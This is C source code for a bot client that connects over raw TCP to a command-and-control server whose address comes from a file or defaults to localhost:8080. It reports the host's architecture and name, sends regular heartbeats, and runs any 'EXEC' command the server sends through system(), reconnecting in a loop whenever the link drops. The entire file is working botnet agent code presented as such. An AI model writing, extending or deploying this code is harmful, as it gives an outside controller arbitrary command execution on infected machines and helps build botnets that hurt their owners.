/* raw TCP bot: heartbeat to C2 and execute remote commands */
#define _POSIX_C_SOURCE 200809L

#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/select.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <sys/types.h>
#include <unistd.h>
#include <netinet/in.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <time.h>

#define DEFAULT_ADDRESS "localhost:8080"
#define BEAT_INTERVAL 15
#define RETRY_USLEEP 500
#define LINE_MAX 4096

static void retry_pause(void) {
	struct timespec ts;
	ts.tv_sec = 0;
	ts.tv_nsec = RETRY_USLEEP * 1000;
	nanosleep(&ts, NULL);
}

static char gtx_line[LINE_MAX];
static size_t gtx_len;

static const char *arch_name(void) {
#if defined(__x86_64__) || defined(_M_X64)
	return "x86_64";
#elif defined(__i386__) || defined(_M_IX86)
	return "x86";
#elif defined(__aarch64__) || defined(_M_ARM64)
	return "arm64";
#elif defined(__arm__) || defined(_M_ARM)
	return "arm";
#elif defined(__mips__) || defined(__mips64__)
	return "mips";
#else
	return "unknown";
#endif
}

static const char *machine_name(void) {
	static char h[256];
	if (gethostname(h, sizeof h) == 0) {
		return h;
	}
	return "bot";
}

static const char *read_address(void) {
	static char addr[256];
	const char *files[] = {"address.txt", "abots/address.txt"};
	for (size_t i = 0; i < sizeof files / sizeof files[0]; i++) {
		FILE *fp = fopen(files[i], "r");
		if (!fp) {
			continue;
		}
		if (fgets(addr, sizeof addr, fp)) {
			fclose(fp);
			addr[strcspn(addr, "\r\n")] = '\0';
			if (addr[0] != '\0') {
				return addr;
			}
		} else {
			fclose(fp);
		}
	}
	return DEFAULT_ADDRESS;
}

static int connect_c2(const char *hostport) {
	char host[256], port[16];
	size_t n = strlen(hostport);
	const char *colon = NULL;
	for (size_t i = 0; i < n; i++) {
		if (hostport[i] == ':') {
			colon = &hostport[i];
			break;
		}
	}
	if (!colon) {
		return -1;
	}
	size_t hl = (size_t)(colon - hostport);
	if (hl >= sizeof host) {
		return -1;
	}
	memcpy(host, hostport, hl);
	host[hl] = '\0';
	snprintf(port, sizeof port, "%s", colon + 1);

	struct addrinfo hints, *res;
	memset(&hints, 0, sizeof hints);
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	if (getaddrinfo(host, port, &hints, &res) != 0) {
		return -1;
	}

	int fd = -1;
	for (struct addrinfo *p = res; p; p = p->ai_next) {
		fd = socket(p->ai_family, p->ai_socktype, p->ai_protocol);
		if (fd < 0) {
			continue;
		}
		if (connect(fd, p->ai_addr, p->ai_addrlen) == 0) {
			break;
		}
		close(fd);
		fd = -1;
	}
	freeaddrinfo(res);
	return fd;
}

static void run_command(const char *cmd) {
	printf("[bot] executing: %s\n", cmd);
	fflush(stdout);
	int rc = system(cmd);
	if (rc != 0) {
		printf("[bot] exec failed: %d\n", rc);
		return;
	}
	printf("[bot] done\n");
	fflush(stdout);
}

static void handle_line(char *line) {
	long len = (long)strlen(line);
	while (len > 0 && (line[len - 1] == '\n' || line[len - 1] == '\r')) {
		line[--len] = '\0';
	}
	if (strncmp(line, "EXEC ", 5) == 0) {
		run_command(line + 5);
	}
}

static void feed_byte(char ch) {
	if (ch == '\n') {
		gtx_line[gtx_len] = '\0';
		handle_line(gtx_line);
		gtx_len = 0;
		return;
	}
	if (gtx_len < LINE_MAX - 1) {
		gtx_line[gtx_len++] = ch;
	}
}

static int heartbeat(int fd) {
	char ident[512];
	snprintf(ident, sizeof ident, "BEAT %s %s\n", arch_name(), machine_name());
	if (write(fd, ident, strlen(ident)) < 0) {
		return -1;
	}
	while (1) {
		fd_set rfds;
		FD_ZERO(&rfds);
		FD_SET(fd, &rfds);
		struct timeval tv = {BEAT_INTERVAL, 0};
		int ready = select(fd + 1, &rfds, NULL, NULL, &tv);
		if (ready < 0) {
			if (errno == EINTR) {
				continue;
			}
			return -1;
		}
		if (ready == 0) {
			if (write(fd, "PING\n", 5) < 0) {
				return -1;
			}
			continue;
		}
		char buf[512];
		ssize_t n = recv(fd, buf, sizeof buf, 0);
		if (n < 0) {
			return -1;
		}
		if (n == 0) {
			errno = ENOTCONN;
			return -1;
		}
		for (ssize_t i = 0; i < n; i++) {
			feed_byte(buf[i]);
		}
	}
}

int main(void) {
	const char *addr = read_address();
	printf("[bot] heartbeat target: %s\n", addr);
	fflush(stdout);
	for (;;) {
		int fd = connect_c2(addr);
		if (fd < 0) {
			printf("[bot] heartbeat lost on %s: %s\n", addr, strerror(errno));
			fflush(stdout);
			retry_pause();
			continue;
		}
		printf("[bot] connected to %s\n", addr);
		fflush(stdout);
		if (heartbeat(fd) < 0) {
			printf("[bot] heartbeat lost on %s: %s\n", addr, strerror(errno));
			fflush(stdout);
		}
		close(fd);
		retry_pause();
	}
}